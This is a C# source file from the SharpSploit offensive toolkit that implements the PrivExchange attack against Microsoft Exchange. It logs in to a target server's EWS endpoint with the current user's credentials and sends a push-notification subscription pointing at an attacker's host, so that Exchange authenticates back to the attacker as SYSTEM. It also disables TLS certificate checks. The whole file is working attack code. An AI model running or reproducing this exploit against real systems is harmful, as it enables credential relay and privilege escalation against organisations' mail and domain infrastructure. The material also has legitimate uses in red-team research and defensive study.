// Author: Dennis Panagiotopoulos (@den_n1s)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Xml;
using System.Net;
using System.IO;


namespace SharpSploit.Misc
{
    /// <summary>
    /// ExchangePRiv is a class which leverage the privexchange misconfiguration.
    /// </summary>
    public class PrivExchange
    {
        /// <summary>
        /// Logs in on EWS to subscribe to push notifications, which will make Exchange to connect back to the attacker and authenticate as system.
        /// </summary>
        /// <param name="targetHost">Set the IP of the target Exchange server.</param>
        /// <param name="attackerHost">Set the attacker's IP.</param>
        /// <param name="attackerPort">Set the attacker's port</param>
        /// <param name="attackerPage">Set the atacker's page</param>
        /// <param name="SSL">Enable SSL.</param>
        /// <param name="exchangeVersion">Set exchange version, default is 2016.</param>
        /// <param name="exchangePort">Set exchange's target port.</param>
        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
        /// <remarks>
        /// Credits to @_dirkjan for the discovery of this attack and to @g0ldenGunSec for his powershell implementation which I relied on.
        /// </remarks>
        public static string PushNotification(string targetHost, string attackerHost, string attackerPort, string attackerPage, string SSL, string exchangeVersion, string exchangePort)
        {
            //string ExchangeVersion = exchangeVersion;
            //string ExchangePort = exchangePort;

            //building out exchange server target URL
            string URL = "";
            if (SSL == "true")
            {
               URL = "https://" + targetHost + ":" + exchangePort + "/EWS/Exchange.asmx";
            }
            else
            {
               URL = "http://" + targetHost + ":" + exchangePort + "/EWS/Exchange.asmx";
            }

            Console.WriteLine("The target URL is {0}\n", URL);

            string attackerURL = "http://" + attackerHost + ":" + attackerPort + "/" + attackerPage;


            XmlDocument soapEnvelopeXml = new XmlDocument();

            string soapRequestXML = @"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:t = ""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:m =""http://schemas.microsoft.com/exchange/services/2006/messages"">
            <soap:Header><t:RequestServerVersion Version=""Exchange9999"" /></soap:Header >
            <soap:Body ><m:Subscribe><m:PushSubscriptionRequest SubscribeToAllFolders = ""true"">
                <t:EventTypes><t:EventType> NewMailEvent </t:EventType><t:EventType> ModifiedEvent </t:EventType><t:EventType> MovedEvent </t:EventType></t:EventTypes>
                <t:StatusFrequency> 1 </t:StatusFrequency ><t:URL>  URLHere  </t:URL></m:PushSubscriptionRequest></m:Subscribe>
            </soap:Body>
            </soap:Envelope> ";

            soapRequestXML = soapRequestXML.Replace("URLHere", attackerURL);
            soapRequestXML = soapRequestXML.Replace("9999", exchangeVersion);

            soapEnvelopeXml.LoadXml(soapRequestXML);

            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(URL);
            request.ContentType = "text/xml;charset=\"utf-8\"";
            request.Method = "POST";
            request.UseDefaultCredentials = true;

            //send request to exchange server
            try
            {
                Console.WriteLine("Sent request to exchange server: {0}\n", URL);
                Stream newStream = request.GetRequestStream();
                soapEnvelopeXml.Save(newStream);
                newStream.Close();
            }
            catch (System.Net.WebException)
            {
                //Console.WriteLine("Error request unsuccessful\n");
                return "error request unsuccessful";
            }

            //receive response from exchange server
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader rd = new StreamReader(response.GetResponseStream());
                string xmlResult = rd.ReadToEnd();
                //Console.WriteLine("The status code is: {0}", response.StatusCode);
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    if (xmlResult.Contains("NoError"))
                    {
                        //Console.WriteLine("HTTP 200 response received, the target Exchange server should be authenticating shortly.\n");
                        return "HTTP 200 response received, the target Exchange server should be authenticating shortly.";
                    }
                    else if (xmlResult.Contains("ErrorMissingEmailAddress"))
                    {
                        //Console.WriteLine("Error: User does not have an email address associated with their account.\n");
                        return "Error: User does not have an email address associated with their account";
                    }
                    else
                    {
                        //Console.WriteLine("An error has occured, attack was likely unsuccessful.\n");
                        return "An error has occured, attack was likely unsuccessful";
                    }
                }
                else
                {
                    //Console.WriteLine("Invalid / no response received, but a web exception did not occur. Attack may not have worked\n");
                    return "Invalid / no response received, but a web exception did not occur. Attack may not have worked";
                }
                response.Close();
                return "Exiting...";
            }
            catch (WebException ex)
            {
                //Console.WriteLine("Error request unsuccessful\n");
                //Console.WriteLine(ex.Message);
                return (ex.Message);
            }

        }

    }
}